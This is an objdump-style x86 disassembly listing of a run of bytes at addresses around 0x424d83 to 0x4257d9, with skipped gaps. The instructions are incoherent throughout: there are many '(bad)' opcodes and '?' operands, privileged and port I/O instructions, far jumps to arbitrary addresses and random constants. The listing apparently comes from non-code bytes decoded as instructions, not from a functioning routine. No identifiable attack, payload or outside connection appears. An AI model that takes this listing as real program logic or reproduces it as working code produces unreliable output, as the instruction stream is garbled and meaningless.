  424d83:	cmp    BYTE PTR [ebp-0x1b],0x10
  424d87:	adc    al,0x7
  424d89:	bound  esp,QWORD PTR [edi]
  424d8b:	in     al,dx
  424d8c:	cmp    dh,dl
  424d8e:	adc    al,0x8f
  424d90:	call   0x18854170
  424d95:	push   ebx
  424d96:	adc    eax,0x1eedbf7f
  424d9b:	jns    0x424ddf
  424d9d:	(bad)  
  424d9e:	and    DWORD PTR [eax+0x9a9f7],ebx
  424da4:	std    
  424da5:	adc    al,0xa1
  424da7:	mov    WORD PTR [edx],ss
  424da9:	lds    eax,FWORD PTR [ebp+ecx*8-0x1]
  424dad:	rcl    DWORD PTR [edi+0x1c69c511],1
  424db3:	xchg   ebx,eax
  424db4:	pop    ecx
  424db5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424db6:	aam    0x86
  424db8:	(bad)  
  424db9:	in     eax,0x0
	...
  424dd7:	add    BYTE PTR [ebp+0xee8fed8],dl
  424ddd:	sbb    dl,BYTE PTR [eax]
  424ddf:	je     0x424da5
  424de1:	scas   eax,DWORD PTR es:[edi]
  424de2:	imul   ebp,ecx,0xb9128b3e
  424de8:	add    al,0xcd
  424dea:	jmp    FWORD PTR [ecx-0x3b]
  424ded:	clc    
  424dee:	imul   eax,DWORD PTR [eax],0x8965d8e6
  424df4:	mov    cl,0x50
  424df6:	or     esi,DWORD PTR [esi+0xf4464b1]
  424dfc:	jo     0x424e2a
  424dfe:	std    
  424dff:	jmp    esp
  424e01:	enter  0x973,0xf2
  424e05:	ss repz pop ebx
  424e08:	or     eax,0xa4fffc70
  424e0d:	jg     0x424e50
  424e0f:	rcr    BYTE PTR [esi+ebp*2],1
  424e12:	dec    edi
  424e13:	jmp    FWORD PTR [ebx+0x2189ed0d]
  424e19:	jno    0x424e9a
  424e1b:	(bad)  
  424e1c:	stos   DWORD PTR es:[edi],eax
  424e1d:	hlt    
  424e1e:	loopne 0x424e1f
  424e20:	xor    DWORD PTR [eax+0x66],esp
  424e23:	pop    edx
  424e24:	inc    edx
  424e25:	aad    0xe7
  424e27:	and    DWORD PTR [edx+0x71],ebx
  424e2a:	sti    
  424e2b:	mov    ebx,DWORD PTR [ebp+eax*4-0x5]
  424e2f:	add    DWORD PTR [ecx],esi
  424e31:	retf   0x4588
  424e34:	pop    esp
  424e35:	ror    BYTE PTR [eax-0x182f5bbb],1
  424e3b:	cwde   
	...
  424e58:	add    BYTE PTR [eax],al
  424e5a:	add    DWORD PTR [ecx-0x5],esi
  424e5d:	mov    esi,ecx
  424e5f:	jae    0x424de8
  424e61:	clc    
  424e62:	mov    ebp,0xdfe8dfef
  424e67:	(bad)  
  424e68:	cli    
  424e69:	jmp    DWORD PTR [edi+0x3875fb71]
  424e6f:	or     eax,0x3772085a
  424e74:	repz pop ebx
  424e76:	lea    ebp,[edi*8-0x1836db01]
  424e7d:	aaa    
  424e7e:	cmp    eax,DWORD PTR [eax]
  424e80:	add    BYTE PTR [ebx+0x5d876bb1],cl
  424e86:	or     eax,0xfc785a1
  424e8b:	dec    ecx
  424e8c:	sbb    bl,BYTE PTR [edx+0x5a]
  424e8f:	cbw    
  424e91:	aad    0xe8
  424e93:	retf   0x8891
  424e96:	in     eax,0x16
  424e98:	xchg   edx,eax
  424e99:	(bad)  
  424e9a:	popa   
  424e9b:	mov    eax,ds:0xf1ed7291
  424ea0:	lods   eax,DWORD PTR ds:[esi]
  424ea1:	push   eax
  424ea2:	retf   0x7dea
  424ea5:	jb     0x424e54
  424ea7:	add    DWORD PTR [ebx],ecx
  424ea9:	push   ebx
  424eaa:	mov    edx,0xb2fc85fa
  424eaf:	xchg   edx,eax
  424eb0:	test   BYTE PTR [ebp-0x56],ch
  424eb3:	mov    cl,BYTE PTR [esi+0x1498a280]
  424eb9:	add    al,0xd3
  424ebb:	fs (bad) 
  424ebd:	inc    DWORD PTR [eax]
	...
  424edb:	add    BYTE PTR [esp+ebx*8+0x3deb5c8a],al
  424ee2:	mov    ecx,0x269909c1
  424ee7:	mov    eax,edx
  424ee9:	ret    
  424eea:	sub    DWORD PTR [edi+0x427a66c8],eax
  424ef0:	jb     0x424f0e
  424ef2:	or     eax,0xb7dc94d0
  424ef7:	out    0xd3,eax
  424ef9:	out    0x8e,al
  424efb:	cld    
  424efc:	xchg   BYTE PTR [ecx-0x7e],ch
  424eff:	std    
  424f00:	dec    edx
  424f01:	call   0x558e:0x72423984
  424f08:	and    eax,0xd00215f
  424f0d:	adc    BYTE PTR [esp+ebp*8],0xb7
  424f11:	fidivr WORD PTR [ecx]
  424f13:	push   ecx
  424f14:	xor    eax,0x1afc8d89
  424f19:	push   ss
  424f1a:	mov    esi,?
  424f1c:	cdq    
  424f1d:	(bad)  
  424f1e:	out    dx,al
  424f1f:	cmp    ebp,esi
  424f21:	or     BYTE PTR [edx-0x1a68fe70],bh
  424f27:	test   BYTE PTR [edx],al
  424f29:	mov    edx,ebx
  424f2b:	or     ebx,ecx
  424f2d:	inc    esp
  424f2e:	ds sub eax,0x472503f4
  424f34:	in     al,0xff
  424f36:	ds (bad) 
  424f38:	aas    
  424f39:	mov    ebp,DWORD PTR ds:0xe7875784
  424f3f:	push   ss
	...
  424f5c:	add    BYTE PTR [eax],al
  424f5e:	test   eax,0x64989b7f
  424f63:	adc    al,0x7d
  424f65:	xchg   ecx,eax
  424f66:	aas    
  424f67:	pushf  
  424f68:	or     eax,0x615b817
  424f6d:	xor    eax,0x90fbd4b5
  424f72:	mov    eax,ds:0x7e012684
  424f77:	mov    edi,0x773f8801
  424f7c:	shl    BYTE PTR [esp+edi*1],cl
  424f7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f80:	xor    al,0x39
  424f82:	inc    ebp
  424f83:	in     eax,dx
  424f84:	mov    dh,0xae
  424f86:	int    0xff
  424f88:	push   ebx
  424f89:	loop   0x424f3b
  424f8b:	mul    DWORD PTR [esp+eax*2-0x941cdf3]
  424f92:	cli    
  424f93:	in     eax,dx
  424f94:	es add al,0x15
  424f97:	in     eax,dx
  424f98:	xchg   esi,eax
  424f99:	scas   al,BYTE PTR es:[edi]
  424f9a:	int    0xff
  424f9c:	sbb    esi,ebp
  424f9e:	xchg   ebx,eax
  424f9f:	in     al,dx
  424fa0:	ret    0xcdbf
  424fa3:	call   FWORD PTR [edi-0x12]
  424fa6:	pop    esi
  424fa7:	lods   al,BYTE PTR ds:[esi]
  424fa8:	sub    DWORD PTR [ebx+ecx*2],eax
  424fab:	add    al,0x97
  424fad:	scas   al,BYTE PTR es:[edi]
  424fae:	int    0xff
  424fb0:	out    0x39,eax
  424fb2:	and    ah,dh
  424fb4:	call   esp
  424fb6:	and    dl,cl
  424fb8:	jmp    DWORD PTR [ecx-0x35]
  424fbb:	imul   DWORD PTR [eax]
  424fbd:	sub    ah,BYTE PTR [edx]
  424fbf:	int    0x47
  424fc1:	mov    cl,0x0
	...
  424fdf:	add    BYTE PTR [edx],bl
  424fe1:	fadd   DWORD PTR [edi-0x23]
  424fe4:	jmp    0x82fb:0x36f97441
  424feb:	sub    al,0xe
  424fed:	add    BYTE PTR [eax],al
  424fef:	jle    0x424f9f
  424ff1:	repz aas 
  424ff3:	jmp    0xc2b33f0
  424ff8:	cmp    al,0xb9
  424ffa:	adc    eax,0x23160ea9
  424fff:	adc    dh,BYTE PTR [edi+0x4effef4c]
  425005:	add    BYTE PTR [edx-0x3f],ch
  425008:	xchg   ecx,eax
  425009:	stc    
  42500a:	mov    esp,0xffc9a429
  42500f:	xchg   edx,eax
  425010:	mov    dl,0x98
  425012:	add    al,0x36
  425014:	ds repz aas 
  425017:	jmp    0xde1360c
  42501c:	dec    ebp
  42501d:	inc    eax
  42501e:	add    BYTE PTR [edi],bh
  425020:	push   esi
  425021:	shl    BYTE PTR [edx+0x1a],0x19
  425025:	mov    al,0x77
  425027:	sub    DWORD PTR [ecx],ecx
  425029:	mov    edx,DWORD PTR [edx]
  42502b:	sbb    eax,0x1ffc95f
  425030:	dec    esi
  425031:	or     eax,0x1179411d
  425036:	inc    eax
  425037:	jmp    0x5154db5a
  42503c:	aas    
  42503d:	leave  
  42503e:	dec    DWORD PTR [ecx+0x35]
  425041:	mov    ch,0x40
  425043:	jmp    0x425048
	...
  425060:	add    BYTE PTR [eax],al
  425062:	inc    edi
  425063:	shl    BYTE PTR [edx-0x22],0x8f
  425067:	sar    esp,0x0
  42506a:	xlat   BYTE PTR ds:[ebx]
  42506b:	xchg   edi,eax
  42506c:	enter  0x3443,0x66
  425070:	add    DWORD PTR [ecx+0x3f4948],esp
  425076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425077:	jnp    0x425074
  425079:	je     0x425030
  42507b:	mov    ch,0xbf
  42507d:	je     0x4250a0
  42507f:	jg     0x4250ca
  425081:	or     BYTE PTR [ebp-0xbff9833],dh
  425087:	cld    
  425088:	call   DWORD PTR [esi+0x53]
  42508b:	push   esp
  42508c:	add    eax,0x55873d99
  425092:	in     al,dx
  425093:	add    eax,0xcc0c4a
  425098:	std    
  425099:	push   DWORD PTR [esp+eiz*2-0x34b791e]
  4250a0:	cli    
  4250a1:	jne    0x42504f
  4250a3:	add    eax,0x18b9ffed
  4250a8:	adc    eax,DWORD PTR [eax-0x4c]
  4250ab:	mov    ch,0xef
  4250ad:	jne    0x425077
  4250af:	jns    0x425122
  4250b1:	or     al,0xa3
  4250b3:	xchg   DWORD PTR [ebx+edx*1+0x1affc64],esp
  4250ba:	pop    edi
  4250bb:	fwait
  4250bc:	sti    
  4250bd:	jne    0x42512f
  4250bf:	or     edx,0x0
  4250c2:	adc    al,0x4
  4250c4:	add    BYTE PTR [ebx+0x0],dl
	...
  4250e3:	add    BYTE PTR [edi],dh
  4250e5:	ror    BYTE PTR [esi-0x1],cl
  4250e8:	dec    ecx
  4250e9:	aam    0xe
  4250eb:	inc    eax
  4250ec:	je     0x425165
  4250ee:	mov    esp,0xbcae7eeb
  4250f3:	pop    edi
  4250f4:	add    dl,ch
  4250f6:	pop    eax
  4250f7:	ret    0xfc3c
  4250fa:	push   eax
  4250fb:	mov    edx,DWORD PTR [eax+0xd7d7ed3]
  425101:	xchg   DWORD PTR [eax],eax
  425103:	je     0x425105
  425105:	push   ds
  425106:	dec    eax
  425107:	adc    BYTE PTR [ebx-0x67a436eb],dh
  42510d:	mov    ds:0x94fd4281,al
  425112:	xor    DWORD PTR [esi-0x7a],edx
  425115:	xchg   ebx,eax
  425116:	clc    
  425117:	push   esp
  425118:	nop
  425119:	daa    
  42511a:	inc    BYTE PTR [ebx+0x99d8]
  425120:	xchg   BYTE PTR [esp+edi*8-0x19],bl
  425124:	cmp    BYTE PTR [edi],bl
  425126:	add    DWORD PTR [eax],eax
  425128:	xchg   esi,eax
  425129:	loope  0x425178
  42512b:	add    ecx,DWORD PTR [ecx+ebx*4]
  42512e:	add    BYTE PTR [ecx],bh
  425130:	mov    edx,0xdbd819e
  425135:	cdq    
  425136:	add    BYTE PTR [ecx+0x1d988958],cl
  42513c:	mov    ebx,DWORD PTR [ecx-0x12af7900]
  425142:	leave  
  425143:	les    eax,FWORD PTR [edx]
  425145:	sbb    bl,BYTE PTR [edx-0x1]
	...
  425164:	add    BYTE PTR [eax],al
  425166:	stos   BYTE PTR es:[edi],al
  425167:	cdq    
  425168:	xchg   eax,ebx
  42516a:	sbb    BYTE PTR [ecx+0x150abf87],dl
  425170:	outs   dx,BYTE PTR ds:[esi]
  425171:	call   DWORD PTR [edx+0xbf8799]
  425177:	repz (bad) 
  425179:	jb     0x42518c
  42517b:	sub    eax,0x91d18af2
  425180:	dec    BYTE PTR [edi+0x72]
  425183:	sub    al,0x0
  425185:	push   esi
  425186:	push   0xffffffa4
  425188:	cmp    al,0x16
  42518a:	int    0x98
  42518c:	jg     0x425151
  42518e:	or     edi,esp
  425190:	mov    dl,BYTE PTR [edx]
  425192:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425193:	stos   BYTE PTR es:[edi],al
  425194:	inc    eax
  425195:	add    BYTE PTR [esi+0x609cb500],dl
  42519b:	jge    0x425183
  42519d:	add    eax,DWORD PTR [esi-0x4266d304]
  4251a3:	jl     0x425156
  4251a5:	sbb    dh,dl
  4251a7:	jp     0x4251dc
  4251a9:	add    BYTE PTR [esi-0x73da1e34],dl
  4251af:	add    al,0xe5
  4251b1:	lea    esi,[esi+0x184753f6]
  4251b7:	shl    DWORD PTR [esi],cl
  4251b9:	int3   
  4251ba:	dec    edi
  4251bb:	imul   ebp
  4251bd:	jbe    0x425179
  4251bf:	add    ch,BYTE PTR [edi+ecx*4-0x3aee3cf3]
  4251c6:	pop    ebp
  4251c7:	xor    al,0x0
  4251c9:	aas    
	...
  4251e6:	add    BYTE PTR [eax],al
  4251e8:	adc    eax,0x4a35ed0c
  4251ed:	xchg   DWORD PTR [ebx-0x65132e05],edi
  4251f3:	cmc    
  4251f4:	or     al,BYTE PTR [eax]
  4251f6:	push   0xffffffc8
  4251f8:	push   ss
  4251f9:	add    DWORD PTR [ebx+edi*8+0x3e6053a],edx
  425200:	cmp    ebp,esi
  425202:	popa   
  425203:	aas    
  425204:	adc    eax,0xcfbab83
  425209:	sbb    bl,BYTE PTR [ebx-0x1886ccd5]
  42520f:	js     0x425230
  425211:	clc    
  425212:	popa   
  425213:	inc    edi
  425214:	mov    DWORD PTR [edx+ebp*1+0x4],esi
  425218:	wrmsr  
  42521a:	ficom  WORD PTR [esi]
  42521c:	sbb    eax,0xc6f6d62e
  425221:	in     eax,dx
  425222:	es add al,0x8c
  425225:	mov    ebx,0xec6035f2
  42522a:	mov    ?,eax
  42522c:	sbb    al,BYTE PTR [eax]
  42522e:	add    BYTE PTR [edx+0x48],ah
  425231:	xchg   edi,eax
  425232:	add    edx,edi
  425234:	dec    esi
  425235:	and    ebx,DWORD PTR [esi+0x42]
  425238:	xchg   al,al
  42523a:	or     ebp,ecx
  42523c:	pop    ebp
  42523d:	inc    esi
  42523e:	shl    ecx,0xe
  425241:	sbb    al,BYTE PTR [edx]
  425243:	xor    DWORD PTR [edi-0x6],ecx
  425246:	jmp    FWORD PTR [ebx+0x78]
  425249:	adc    bl,BYTE PTR [esi]
  42524b:	jb     0x42524d
	...
  425269:	add    BYTE PTR [ebx],bl
  42526b:	push   ds
  42526c:	int3   
  42526d:	sub    cl,BYTE PTR [ecx]
  42526f:	sar    DWORD PTR [edi+0x1211c764],1
  425275:	jb     0x425272
  425277:	and    esp,ecx
  425279:	stos   BYTE PTR es:[edi],al
  42527a:	push   cs
  42527b:	int    0x31
  42527d:	(bad)  
  42527f:	lds    eax,FWORD PTR [eax-0x413739d5]
  425285:	mov    ebx,0x3ec7807a
  42528a:	int    0x30
  42528c:	push   ebx
  42528d:	(bad)  
  42528f:	fisttp DWORD PTR [ebx]
  425291:	push   0xffffff86
  425293:	test   BYTE PTR [eax],dh
  425295:	inc    edx
  425296:	stc    
  425297:	jbe    0x425290
  425299:	loop   0x425230
  42529b:	hlt    
  42529c:	sub    DWORD PTR [ebp+0xe],0x0
  4252a0:	add    BYTE PTR [edx-0x55],ah
  4252a3:	sbb    eax,0xcf0eaacc
  4252a8:	mov    edi,0x75b8c597
  4252ad:	enter  0xf215,0x63
  4252b1:	sbb    eax,0xdb88ffcd
  4252b6:	push   eax
  4252b7:	jecxz  0x42532c
  4252b9:	repz into 
  4252bb:	jle    0x425282
  4252bd:	add    DWORD PTR [edx+0x46],eax
  4252c0:	jno    0x425297
  4252c2:	mov    bh,al
  4252c4:	mov    BYTE PTR [eax],al
  4252c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252c7:	in     eax,0xf5
  4252c9:	sub    BYTE PTR [edi+0x6b],ah
  4252cc:	xchg   eax,edi
	...
  4252ea:	add    BYTE PTR [eax],al
  4252ec:	adc    DWORD PTR [ebp-0x5b9294c3],esp
  4252f2:	mov    edx,0x3d7864
  4252f7:	call   0x3f889d
  4252fc:	mov    al,ds:0xaf4170bb
  425301:	mov    dh,0x64
  425303:	int3   
  425304:	idiv   ebx
  425306:	cli    
  425307:	add    eax,0x3f47fc
  42530c:	scas   eax,DWORD PTR es:[edi]
  42530d:	jo     0x425376
  42530f:	test   ah,0xfd
  425312:	xor    BYTE PTR [eax+edi*1+0x3d],ah
  425316:	add    BYTE PTR [esp+ebx*1-0x33],dh
  42531a:	dec    esi
  42531b:	push   ebx
  42531c:	mov    bh,0x3
  42531e:	sub    ecx,DWORD PTR [eax+0x15fb84ba]
  425324:	loopne 0x4252b1
  425326:	cmp    al,0x0
  425328:	addr16 retf 0xff1b
  42532c:	ins    DWORD PTR es:[edi],dx
  42532d:	inc    edx
  42532e:	or     BYTE PTR [ecx+0x5e858c9a],cl
  425334:	les    eax,FWORD PTR [ebx]
  425336:	pop    ebx
  425337:	adc    al,0x3d
  425339:	ficom  DWORD PTR [edi]
  42533b:	mov    DWORD PTR [edx-0x60],edi
  42533e:	test   DWORD PTR [esi-0x30],ebx
  425341:	add    eax,0xd76b5ec4
  425346:	push   esi
  425347:	ret    0xb0
  42534a:	push   esi
  42534b:	mov    edx,DWORD PTR [ebp+eiz*8+0x28f5]
	...
  42536e:	ja     0x42531f
  425370:	pusha  
  425371:	int3   
  425372:	aaa    
  425373:	cld    
  425374:	push   edx
  425375:	jmp    edx
  425377:	cmp    DWORD PTR [edi+0x26],0xd
  42537b:	xchg   edi,eax
  42537c:	mov    DWORD PTR [edx],edx
  42537e:	adc    DWORD PTR [edx-0x3b9dffc0],ecx
  425384:	mul    edi
  425386:	lds    eax,FWORD PTR [edx]
  425388:	add    DWORD PTR [eax],eax
  42538a:	push   edx
  42538b:	(bad)  
  42538c:	repz mov bl,dl
  42538f:	stos   BYTE PTR es:[edi],al
  425390:	cwde   
  425391:	(bad)  
  425392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425393:	pop    ebp
  425394:	mov    esp,edi
  425396:	ret    
  425397:	(bad)  
  425398:	fwait
  425399:	xor    dh,BYTE PTR [ecx-0x6a]
  42539c:	add    BYTE PTR [ecx-0xa80455d],cl
  4253a2:	cdq    
  4253a3:	xchg   esp,eax
  4253a4:	cs call 0x45fd99
  4253aa:	ins    BYTE PTR es:[edi],dx
  4253ab:	(bad)  
  4253ac:	mov    bh,0x40
  4253ae:	or     eax,0xcd82891e
  4253b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253b4:	aas    
  4253b5:	mov    DWORD PTR [eax],esp
  4253b7:	mov    ebp,0x1e0d40b4
  4253bc:	mov    ecx,0x7701d468
  4253c1:	dec    ebx
  4253c2:	cld    
  4253c3:	loopne 0x42534a
  4253c5:	ss or  eax,0xe480fe4c
  4253cb:	add    DWORD PTR [ecx],edi
  4253cd:	jae    0x42538f
  4253cf:	mov    cs,WORD PTR [eax+0x73]
	...
  4253ed:	add    BYTE PTR [eax],al
  4253ef:	add    dl,ch
  4253f1:	adc    ecx,DWORD PTR [edx-0x67b8f48e]
  4253f7:	bnd jbe 0x425393
  4253fa:	add    BYTE PTR [edi],bl
  4253fc:	call   0xd83087d
  425401:	out    dx,al
  425402:	stc    
  425403:	mov    dl,cl
  425405:	outs   dx,BYTE PTR ds:[esi]
  425406:	mov    ebx,0xb4755327
  42540b:	inc    eax
  42540c:	or     eax,0xdb8e501
  425411:	add    bh,ah
  425413:	jp     0x42544c
  425415:	sbb    BYTE PTR [ebx+0x35230d45],ch
  42541b:	lds    edi,FWORD PTR [edi-0x2dcc458a]
  425421:	sub    DWORD PTR [edi-0x4],edi
  425424:	fidivr WORD PTR [esi]
  425426:	out    0x88,eax
  425428:	inc    edx
  425429:	jns    0x425456
  42542b:	mov    WORD PTR [edx],?
  42542d:	nop
  42542e:	add    eax,DWORD PTR [ebx]
  425430:	or     eax,0x8efc1b77
  425435:	shr    ch,0x7f
  425438:	mov    DWORD PTR [eax],eax
  42543a:	out    0x3,eax
  42543c:	xchg   esp,eax
  42543d:	cmp    eax,0xcf1a84f7
  425442:	cli    
  425443:	ror    BYTE PTR [ebp-0x20efdb78],1
  425449:	jle    0x4254b9
  42544b:	and    BYTE PTR [ecx+0x708c69d5],al
  425451:	or     eax,0x7cd7
	...
  425472:	inc    edi
  425473:	in     al,dx
  425474:	imul   ebx,DWORD PTR [edi],0x1f69fff1
  42547a:	adc    eax,0x153f5c00
  42547f:	xor    BYTE PTR [edi+edi*1-0x27],dh
  425483:	das    
  425484:	pmaddwd mm5,QWORD PTR ds:[ecx]
  425488:	aas    
  425489:	popf   
  42548a:	adc    eax,0x827ee700
  42548f:	or     al,0xb7
  425491:	xor    DWORD PTR [ebp+0xd03f73e],esp
  425497:	xchg   edi,eax
  425498:	sahf   
  425499:	xor    al,0x40
  42549b:	inc    ebx
  42549c:	call   0xff88:0x9e004db7
  4254a3:	out    0xd8,eax
  4254a5:	inc    ebx
  4254a6:	or     eax,0x94bcff98
  4254ab:	cmp    esp,0xffffffbb
  4254ae:	mov    cl,0x7f
  4254b0:	mul    esi
  4254b2:	or     ch,cl
  4254b4:	mov    ah,ch
  4254b6:	adc    dh,BYTE PTR [eax+eax*2+0x27c009e9]
  4254bd:	adc    DWORD PTR ds:0x553d03f8,esi
  4254c3:	xor    DWORD PTR [ebx-0xf],0x56
  4254c7:	adc    DWORD PTR [edx],0x79
  4254ca:	inc    eax
  4254cb:	ret    0xaeff
  4254ce:	dec    ecx
  4254cf:	sub    edi,ebp
  4254d1:	cld    
  4254d2:	xor    dh,al
  4254d4:	aas    
  4254d5:	jmp    0x4254da
	...
  4254f2:	add    BYTE PTR [eax],al
  4254f4:	in     eax,0x7b
  4254f6:	fdiv   DWORD PTR [edx]
  4254f8:	std    
  4254f9:	stc    
  4254fa:	or     BYTE PTR [ecx+ebx*1],0x1e
  4254fe:	je     0x4254d9
  425500:	test   DWORD PTR ds:0xec037e18,ecx
  425506:	cld    
  425507:	cld    
  425508:	inc    BYTE PTR [edx+esi*2+0x52833cdd]
  42550f:	popa   
  425510:	and    al,0xb9
  425512:	shl    ebp,0xe
  425515:	xor    DWORD PTR [ecx-0x44],edx
  425518:	imul   ebp,DWORD PTR [edx-0x592ec3d0],0x41c0ee72
  425522:	out    0xed,al
  425524:	sldt   WORD PTR [eax]
  425527:	shl    esi,0xb5
  42552a:	inc    eax
  42552b:	jmp    0xfb5a43c5
  425530:	dec    esi
  425531:	add    dh,al
  425533:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425534:	sar    al,cl
  425536:	dec    edi
  425538:	ret    
  425539:	ror    ebx,0xaa
  42553c:	push   cs
  42553d:	or     eax,0xd279001a
  425542:	add    DWORD PTR [si-0x37f],esp
  425547:	(bad)  
  425548:	imul   ebp,DWORD PTR [ecx+0x1c74400d],0xfc27cc3d
  425552:	lds    esp,FWORD PTR ss:[ebx+0x1]
  425556:	enter  0x0,0x0
	...
  425576:	je     0x425575
  425578:	xchg   BYTE PTR ds:0x3f482c,cl
  42557e:	push   edi
  42557f:	mov    ebp,0x901acd37
  425584:	xchg   DWORD PTR ds:0x3f47f8,edx
  42558a:	cmp    eax,0xa80f7e99
  42558f:	add    al,0xfd
  425591:	jmp    DWORD PTR [edi*1+0x6806c137]
  425598:	push   edx
  425599:	lea    eax,[eax+0x8]
  42559c:	add    DWORD PTR [eax],eax
  42559e:	and    al,0xfd
  4255a0:	mov    ebp,0x3d6044
  4255a5:	call   0x3f883f
  4255aa:	push   0x74840bbc
  4255af:	cld    
  4255b0:	(bad)  
  4255b1:	inc    DWORD PTR [ebp-0xbbc343d]
  4255b7:	add    eax,0x3d00440a
  4255bc:	add    BYTE PTR [ebx+0x400da0d9],cl
  4255c2:	in     al,0xd1
  4255c4:	imul   esp,DWORD PTR [ebx],0xff7d982d
  4255ca:	test   eax,0xa443cbc4
  4255cf:	iret   
  4255d0:	cli    
  4255d1:	xor    eax,0x3f4864
  4255d6:	or     eax,0x88adea
	...
  4255f7:	add    BYTE PTR [ebp+0x387387ad],ah
  4255fd:	ins    DWORD PTR es:[edi],dx
  4255fe:	stc    
  4255ff:	push   edx
  425600:	xchg   edx,eax
  425601:	dec    ebx
  425602:	inc    eax
  425603:	int3   
  425604:	into   
  425605:	xchg   esi,eax
  425606:	test   ebp,edx
  425608:	xchg   esi,eax
  425609:	xchg   cl,cl
  42560b:	repnz xchg bl,ch
  42560e:	fisttp DWORD PTR [esi]
  425610:	int    0x96
  425612:	or     al,0x39
  425614:	not    DWORD PTR [esi-0x67b4a9d3]
  42561a:	inc    esi
  42561b:	xchg   bl,bl
  42561d:	xchg   edi,eax
  42561e:	mov    edx,0xbd2f0845
  425623:	inc    ebp
  425624:	adc    esi,ebp
  425626:	mov    esi,0x3a590d3e
  42562b:	or     cl,BYTE PTR [esi+0x6e]
  42562e:	out    dx,eax
  42562f:	clc    
  425630:	or     eax,0xa1bf7f97
  425635:	cwde   
  425636:	mov    edx,0x385e943
  42563b:	jmp    0x247ea72e
  425640:	push   es
  425641:	cwde   
  425642:	cdq    
  425643:	sbb    eax,0xfd040363
  425648:	cmp    BYTE PTR [ecx],ch
  42564a:	mov    eax,0xafe60d40
  42564f:	push   esp
  425650:	imul   eax,DWORD PTR [di+0x4d32],0xe2004225
  425659:	xor    al,0x86
  42565b:	or     al,BYTE PTR [eax]
	...
  425679:	add    BYTE PTR [ebp+0x35],al
  42567c:	inc    edx
  42567d:	add    BYTE PTR [edx],dh
  42567f:	lahf   
  425680:	sbb    BYTE PTR [eax],ch
  425682:	fldcw  WORD PTR [edx+0x4d18fd00]
  425688:	out    dx,al
  425689:	aas    
  42568a:	or     eax,0xe93f7100
  42568f:	or     bh,BYTE PTR [edx+ebp*1+0x7abb4342]
  425696:	mov    dh,0x83
  425698:	cli    
  425699:	idiv   BYTE PTR ds:0x1ad071d6
  42569f:	adc    eax,0xe9e003a7
  4256a4:	jmp    0x7940:0x5bdf5a7a
  4256ab:	shl    BYTE PTR [ebx+0x3f],1
  4256ae:	jns    0x425680
  4256b0:	push   eax
  4256b1:	add    edi,DWORD PTR [eax+ecx*4+0x56618853]
  4256b8:	arpl   sp,ax
  4256ba:	fimul  WORD PTR [edi]
  4256bc:	jb     0x4256f5
  4256be:	pop    ecx
  4256bf:	test   DWORD PTR [edi-0x7f97edf0],ebp
  4256c5:	xchg   BYTE PTR [ecx+0x7f],al
  4256c8:	(bad)  
  4256c9:	les    edi,FWORD PTR [esi+0x313f741e]
  4256cf:	shr    BYTE PTR [ebx+0x3f],1
  4256d2:	and    eax,0xbdef00d0
  4256d7:	mov    BYTE PTR [ebx],cl
  4256d9:	mov    BYTE PTR [ecx],bl
  4256db:	push   esi
  4256dc:	imul   eax,esp,0x0
	...
  4256fb:	add    BYTE PTR [esi+0x5076a0e],bl
  425701:	add    bl,bh
  425703:	cli    
  425704:	xchg   ebp,eax
  425705:	fsubr  QWORD PTR [esi-0x67]
  425708:	mov    bh,0x31
  42570a:	daa    
  42570b:	cdq    
  42570c:	or     al,0xb0
  42570e:	out    0x24,eax
  425710:	dec    ebx
  425711:	fistp  DWORD PTR [edi]
  425713:	sar    DWORD PTR [edi],0x8d
  425716:	mov    edx,0x528092df
  42571b:	adc    dl,dl
  42571d:	jle    0x425705
  42571f:	xor    BYTE PTR [ebx-0x75],ah
  425722:	(bad)  
  425723:	sti    
  425724:	scas   al,BYTE PTR es:[edi]
  425725:	adc    BYTE PTR [eax-0x17],al
  425728:	jmp    0xfad4545d
  42572d:	dec    ebx
  42572e:	inc    eax
  42572f:	jmp    0xd4c8ae59
  425734:	add    cl,BYTE PTR [eax+eax*2-0x17]
  425738:	pop    ss
  425739:	cmp    ch,BYTE PTR [eax+0x35]
  42573c:	dec    esp
  42573d:	add    ch,bh
  42573f:	pop    ss
  425740:	daa    
  425741:	and    al,0x55
  425743:	ss popa 
  425745:	dec    edx
  425746:	inc    eax
  425747:	jmp    0x3954d475
  42574c:	arpl   WORD PTR [esi],di
  42574e:	add    BYTE PTR [edx-0x56],ch
  425751:	or     dl,BYTE PTR [ebp-0x2a]
  425754:	mov    al,0xfe
  425756:	cmp    bh,BYTE PTR [ecx-0x54]
  425759:	mov    edi,0x8459e7ff
  42575e:	test   al,0xe8
	...
  42577c:	add    BYTE PTR [eax],al
  42577e:	push   cs
  42577f:	add    BYTE PTR [ebx+0x66351292],al
  425785:	push   0x45
  425787:	jle    0x4257f9
  425789:	fcom   DWORD PTR [edx+eax*8]
  42578c:	mov    dl,BYTE PTR [ecx+eiz*8]
  42578f:	xlat   BYTE PTR ds:[ebx]
  425790:	out    0x68,eax
  425792:	dec    ecx
  425793:	jle    0x425791
  425795:	add    ecx,esi
  425797:	mov    dh,BYTE PTR [edx-0x5f]
  42579a:	out    0x67,al
  42579c:	jne    0x42575c
  42579e:	push   cs
  42579f:	add    BYTE PTR [ecx+0x76],dl
  4257a2:	repz pop ebp
  4257a4:	adc    DWORD PTR [ecx],ebp
  4257a6:	adc    DWORD PTR [ecx-0x2ff316bd],ecx
  4257ac:	push   eax
  4257ad:	ror    DWORD PTR [edi],cl
  4257af:	mov    DWORD PTR [edx-0x47],eax
  4257b2:	push   ds
  4257b3:	xchg   ebp,eax
  4257b5:	mov    ecx,0xe85776
  4257ba:	dec    ebx
  4257bb:	test   BYTE PTR [esi+0x43],ah
  4257be:	cmp    DWORD PTR [esi],ecx
  4257c0:	les    ebx,FWORD PTR [eax+0x4c]
  4257c3:	xor    DWORD PTR [ebx],edi
  4257c5:	add    BYTE PTR [edi+edx*1+0x2d918d44],ah
  4257cc:	pop    eax
  4257cd:	call   0x3e9c43
  4257d2:	mov    ?,WORD PTR [esi]
  4257d4:	mov    DWORD PTR [ebp-0x4c],esi
  4257d7:	sub    eax,ebp
  4257d9:	cmp    cl,bl
